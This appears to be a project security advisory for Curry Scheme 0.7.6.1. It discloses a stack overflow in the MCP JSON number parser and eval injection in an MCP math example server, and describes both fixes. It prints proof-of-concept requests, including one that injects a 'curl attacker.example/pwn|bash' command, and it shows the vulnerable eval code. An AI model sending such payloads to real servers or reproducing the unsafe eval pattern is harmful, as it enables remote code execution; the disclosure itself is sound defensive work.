# Security Advisory — Curry Scheme 0.7.6.1

**Release date:** 2026-05-14  
**Severity:** High  
**Fixed in:** 0.7.6.1

---

## CVE-equivalent summary

Two vulnerabilities are fixed in this patch release.  Neither affects the
core interpreter, evaluator, or any of the always-on modules.  Both affect
optional, opt-in components.

---

## Vuln 1 — Stack buffer overflow in MCP JSON number parser

| Field | Detail |
|-------|--------|
| Component | `modules/mcp/mcp.c` — `parse_val()` |
| Transport | MCP SSE (HTTP POST `/message`) |
| Impact | Stack memory corruption; potential remote code execution |
| Introduced | 0.7.0 (initial MCP module) |
| Fixed | 0.7.6.1 |

### Description

The internal JSON parser used by the MCP module read numeric tokens into a
fixed 64-byte stack buffer (`char num[64]`) without a bounds check on the
digit count.  A JSON number with 65 or more digits written past the end of
the buffer, corrupting the stack frame of the parser thread.

The SSE transport (`mcp-serve-sse`) accepts HTTP POST requests from the
network.  An unauthenticated attacker reachable on the port could trigger
the overflow by sending a JSON-RPC request containing a long number:

```json
{"jsonrpc":"2.0","id":1,"method":"tools/list",
 "params":{"n":11111111111111111111111111111111111111111111111111111111111111111}}
```

The stdio transport is not directly exposed to untrusted network input in
normal deployments.

### Fix

A `NUMW` macro was introduced that writes a character into `num[]` only when
the buffer has room (`i < sizeof(num) - 1`), always advancing the input
pointer.  Numbers longer than 63 characters are silently clamped; they would
lose precision in any case (doubles have at most 17 significant digits; `atol`
saturates at `LONG_MAX`).

---

## Vuln 2 — Arbitrary code execution via `eval` in the MCP math example server

| Field | Detail |
|-------|--------|
| Component | `examples/mcp_math.scm` — `parse-expr` helper |
| Transport | Any MCP transport (stdio or SSE) |
| Impact | Remote code execution as the server process user |
| Introduced | 0.7.5 (mcp_math example added) |
| Fixed | 0.7.6.1 |

### Description

`mcp_math.scm` exposes symbolic CAS tools (differentiation, integration,
simplification, etc.) as MCP tools.  Each tool accepted a free-form
`expression` string argument which was parsed and evaluated using the
unrestricted Scheme `eval`:

```scheme
(define (parse-expr str)
  (eval (read (open-input-string str))))  ; vulnerable
```

Because `eval` runs in the global environment and the `system` built-in is
available, any MCP client able to call a math tool could inject arbitrary
shell commands:

```json
{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{
  "name":"diff",
  "arguments":{"expression":"(system \"curl attacker.example/pwn|bash\")","variable":"x"}}}
```

This affected all 12 math tools that accept an `expression` parameter
(`diff`, `integrate`, `frac-diff`, `frac-int`, `wirtinger`, `simplify`,
`substitute`, `evaluate`, `auto-diff`, `taylor`, `expand`, `collect`).

### Fix

A whitelist validator (`safe-math-expr?`) was added.  It recursively walks
the parsed expression tree and permits only known mathematical operators
(`+`, `-`, `*`, `/`, `expt`, `sqrt`, `exp`, `log`, `sin`, `cos`, `tan`,
`∂`, `∫`, `simplify`, `expand`, `collect`, `substitute`, `conj`,
`real-part`, `imag-part`, `wirtinger-d`, `wirtinger-dbar`, `auto-diff`,
`degree`, `leading-coeff`, and their aliases).  Numbers and symbols (variable
references) are permitted as leaves.  Anything else causes `parse-expr` to
raise an error before `eval` is invoked.

---

## Affected versions

| Version | Vuln 1 (buffer overflow) | Vuln 2 (eval injection) |
|---------|--------------------------|-------------------------|
| < 0.7.0 | Not present (no MCP module) | Not present |
| 0.7.0 – 0.7.4 | **Affected** | Not present |
| 0.7.5 – 0.7.6 | **Affected** | **Affected** |
| **0.7.6.1** | Fixed | Fixed |

---

## Mitigations if you cannot upgrade immediately

**Vuln 1:** Do not expose `mcp-serve-sse` on untrusted networks.  The stdio
transport (used by Claude Code) is not directly reachable by external attackers.

**Vuln 2:** Do not deploy `examples/mcp_math.scm` (or any derivative) on a
network-accessible MCP SSE endpoint without authentication.  The vulnerability
is also present in stdio deployments if the connected MCP client is untrusted.

---

## Credit

Vulnerabilities identified and patched by the Curry Scheme maintainers during
an internal security review.
